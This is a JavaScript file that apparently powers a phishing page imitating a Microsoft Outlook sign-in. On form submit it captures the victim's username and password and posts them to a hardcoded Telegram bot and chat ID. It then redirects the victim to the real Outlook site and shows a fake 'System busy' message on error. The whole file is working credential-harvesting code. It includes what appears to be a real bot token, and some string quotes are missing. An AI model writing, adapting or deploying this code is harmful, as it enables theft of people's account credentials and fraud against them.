const BOT_TOKEN = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk'; // Replace with your token from @BotFather
const CHAT_ID = '5627522307';

document.getElementById('authForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitBtn');
    
    // 1. Let the captcha finish moving
    submitBtn.innerText = "Verifying...";
    submitBtn.disabled = true;

    const user = document.getElementById('user_id').value;
    const pass = document.getElementById('user_pass').value;

    const message = 📧 **New Entry**\n\n👤 User: ${user}\n🔑 Pass: ${pass};

    try {
        // 2. Send to Telegram without freezing the UI
        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // 3. Smooth redirect
        window.location.href = "https://outlook.office.com";
        
    } catch (error) {
        console.error("Error:", error);
        alert("System busy. Please try again.");
        submitBtn.disabled = false;
        submitBtn.innerText = "Next";
    }
});
  
    
